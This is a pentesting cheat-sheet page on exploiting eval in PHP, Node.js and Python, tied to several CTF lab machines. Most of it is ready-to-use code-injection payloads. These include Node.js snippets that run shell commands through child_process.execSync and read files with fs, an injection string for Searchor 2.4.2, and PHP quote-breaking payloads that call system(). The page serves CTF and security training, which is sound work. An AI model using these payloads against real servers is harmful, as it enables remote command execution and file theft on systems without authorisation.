# Exploiting 'eval' Function

<div class="row row-cols-lg-2"><div>

Almost every language that we encounter during pentesting has an `eval` function that takes a string and execute the code inside.

Such function should be sparingly. Do not pass user input to them.

* PHP Eval Function

```php!
<?php
$payload = "echo 'Hello, World!';";
eval($payload);
```
</div><div>

* JavaScript/Node.js Eval Function

```js!
payload = 'console.log("Hello, World!")'
eval(payload)
```

* Python Eval <small>(or Exec)</small> Function

```js!
payload = "print('Hello, World!')"
eval(payload)
exec(payload)
```
</div></div>

<hr class="sep-both">

## Node.js 'eval' function

[![glitch](../../../../_badges/thm-p/glitch.svg)](https://tryhackme.com/r/room/glitch)
[![celestial](../../../../_badges/htb-p/celestial.svg)](https://app.hackthebox.com/machines/Celestial)
[![node_eval](../../../../_badges/rootme/web_server/node_eval.svg)](https://www.root-me.org/en/Challenges/Web-Server/Node-Eval)

<div class="row row-cols-lg-2"><div>

If the input is evaluated using eval, we can write some code  in it.

* Normal input: `5`
* Normal input wrapped: `(()=>5)()`
* Normal input fully wrapped: `(()=>{return 5})()`
* If it works, we can add some code in-between

```js!
(() => {
  try {
    return `Output: ${require('child_process').execSync('whoami').toString()}`
  } catch (error) {
    return `Error executing command: ${error}`
  }
})()
// without spaces
(()=>{try{return(`Output:${require('child_process').execSync('whoami').toString()}`)}catch(error){return(`Error:${error}`)}})()
```
</div><div>

It's not always possible to return a string, but if errors are returned, you may use them instead of the usual vector.

```js!
(()=>{throw new Error(require("child_process").execSync("whoami").toString())})()
```

Additional payloads:

```js!
res.end(require('fs').readdirSync('.').toString())
res.end(require('fs').readFileSync('file').toString())
```
</div></div>

<hr class="sep-both">

## Python 'eval' function

<div class="row row-cols-lg-2"><div>

#### Searchor 2.4.2

[![busqueda](../../../../_badges/htb-p/busqueda.svg)](https://app.hackthebox.com/machines/Busqueda)

[Poc (python script)](https://github.com/jonnyzar/POC-Searchor-2.4.2) <small>(0.01k ‚≠ê)</small>.

```shell!
$ onectf request -u URL -X POST -d 'engine=Yahoo' -p query -i '<q>, exec(""))#'
```

You can execute python code inside `exec`.
</div><div>
</div></div>

<hr class="sep-both">

## PHP 'eval' function

[![php_eval](../../../../_badges/rootme/web_server/php_eval.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval)
[![php_eval_advanced_filters_bypass](../../../../_badges/rootme/web_server/php_eval_advanced_filters_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval-Advanced-filters-bypass)

<div class="row row-cols-lg-2"><div>

You can inject a function call such as `phpinfo()` while using comments such as `;//` by remove appended code. If the payload is prepended by a quote, then add a matching quote.

```php!
<?php
$x = '';
eval('$x = "' . $payload . '";');
echo $x;
```

A few possible payloads:

```php!
$payload = '" . phpinfo() . "';
$payload = '" . phpinfo() . ";//';
$payload = '" . system("whoami") . ";//';
```
</div><div>

For payloads and filter bypass, refer to my [PHP Cheatsheet](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#php).
</div></div>